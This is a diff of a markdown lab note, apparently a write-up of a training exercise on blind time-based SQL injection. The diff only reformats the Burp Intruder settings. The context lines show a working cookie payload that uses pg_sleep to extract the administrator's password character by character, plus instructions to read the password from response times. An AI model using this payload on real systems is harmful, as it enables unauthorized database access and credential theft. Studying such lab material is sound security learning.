@@ -146,14 +146,17 @@ Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN (substring(password,1,
 Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN substring(password,§1§,1) = '§a§' THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users WHERE username='administrator' limit 1)-- ; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
 ```
 
-Intruder Settings:
+Intruder Settings:  
+
 - cluster bomb
   - 1. pos = number 1-20
   - 2. pos = `a-z`, `0-9`
 - set max concurrent connections to 10
 
-- In results: show `Response received`, which is the response time.
-  - Sort by that and read PW
+In results:
+
+- show `Response received`, which is the response time.
+- Sort by that and read PW
 
 ![blind-timing-data](images/blind-timing-data.png)
 
